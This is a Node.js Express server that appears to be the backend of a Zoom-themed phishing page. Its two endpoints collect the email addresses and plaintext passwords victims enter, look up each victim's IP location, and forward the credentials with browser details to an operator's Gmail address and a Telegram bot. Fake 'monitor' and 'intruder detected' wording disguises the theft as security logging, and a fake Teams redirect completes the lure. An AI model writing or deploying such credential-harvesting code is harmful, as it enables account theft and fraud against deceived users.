require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");
const crypto = require('crypto');
const useragent = require('useragent');
const https = require('https');
const fetch = require('node-fetch');

const app = express();

// --- CONFIGURATION ---
const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "zoom_meeting_secret_2026";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";

const allowedOrigins = [
  'http://localhost:3000',
  'http://localhost:8080',
  'https://business-meeting.vercel.app',
  'https://business-meeting-loer.vercel.app',
  'https://xxx-meeting.vercel.app',
  'https://your-backblaze-or-cuugmstom-domain.com'
];

// --- MIDDLEWARE ---
app.use(cors({
  origin: function (origin, callback) {
    // allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    const normalizedOrigin = origin.replace(/\/$/, "").toLowerCase();
    const isAllowed = allowedOrigins.some(allowed => 
      allowed.replace(/\/$/, "").toLowerCase() === normalizedOrigin
    ) || normalizedOrigin.includes(".vercel.app"); // Allow all Vercel previews

    if (isAllowed) {
      callback(null, true);
    } else {
      console.warn(`[CORS] Blocked: ${origin}`);
      callback(new Error(`CORS blocked for origin: ${origin}`));
    }
  },
  credentials: true
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

// --- EMAIL (SMTP) SETUP ---
// Using Port 587 with secure: false is the most reliable for Render
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // TLS
  pool: true,
  auth: { user: smtpUser, pass: smtpPass },
  connectionTimeout: 30000,
  greetingTimeout: 30000,
  socketTimeout: 30000,
  debug: true,
  logger: true
});

transporter.verify((error, success) => {
  if (error) {
    console.error("❌ SMTP Verification Error:", error.message);
    console.error("DEBUG: host=smtp.gmail.com, port=587, secure=false, user=" + smtpUser);
  } else {
    console.log("✅ Mail Server Ready (Port 587)");
  }
});

// --- HELPERS ---
function getClientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
    || req.connection?.remoteAddress
    || req.socket?.remoteAddress
    || "unknown";
}

async function getLocationFromIp(ip) {
  return new Promise((resolve) => {
    https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, (resp) => {
      let data = '';
      resp.on('data', chunk => data += chunk);
      resp.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response.status === 'success' 
            ? `${response.city}, ${response.regionName}, ${response.country}` 
            : 'Location unavailable');
        } catch (e) { resolve('Location error'); }
      });
    }).on('error', () => resolve('Location error'));
  });
}

async function sendTelegramAlert(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  } catch (e) { console.error('Telegram error:', e.message); }
}

// --- ENDPOINTS ---

app.post('/api/log-action', async (req, res) => {
  try {
    const { action, email, password, intruderDetected } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);
    const ua = req.headers['user-agent'];

    console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);

    const mailText = `🚨 ZOOM MEETING MONITOR - ${String(action || '').toUpperCase()}
═══════════════════════════════════════════════
ACTION: ${action}
EMAIL: ${email || 'none'}
PASSWORD ATTEMPT: ${password || 'N/A'}
IP: ${ip}
LOCATION: ${location}
BROWSER: ${ua}
URL: ${req.headers.referer || 'unknown'}
TIME: ${new Date().toISOString()}
${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
═══════════════════════════════════════════════`;

    transporter.sendMail({
      from: smtpUser,
      to: adminEmail,
      subject: `🚨 Zoom Action: ${String(action || '').toUpperCase()} from ${location}`,
      text: mailText
    }).catch(e => console.error(`❌ Mail Error (${action}):`, e.message));

    sendTelegramAlert(`Zoom Action: ${action} | Email: ${email || 'none'} | IP: ${ip}`);

    res.json({ success: true });
  } catch (error) {
    console.error('API Error (/log-action):', error.message);
    res.status(500).json({ success: false });
  }
});

app.post('/api/authenticate', async (req, res) => {
  try {
    const { email, password } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);

    console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);

    const mailText = `🔐 Zoom Email Password Attempt
Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${location}
Browser: ${req.headers['user-agent']}
Time: ${new Date().toISOString()}`;

    transporter.sendMail({
      from: smtpUser,
      to: adminEmail,
      subject: `🔐 Zoom Attempt: ${email}`,
      text: mailText
    }).catch(e => console.error(`❌ Mail Error (Auth):`, e.message));

    sendTelegramAlert(`Zoom Login: ${email} | IP: ${ip}`);

    if (password === EMAIL_PASSWORD) {
      const redirect = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
      return res.json({ success: true, redirect });
    } else {
      return res.status(401).json({ success: false, error: 'Invalid password.' });
    }
  } catch (error) {
    console.error('API Error (/authenticate):', error.message);
    res.status(500).json({ success: false });
  }
});

app.get('/health', (req, res) => res.json({ status: 'OK', time: new Date() }));

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
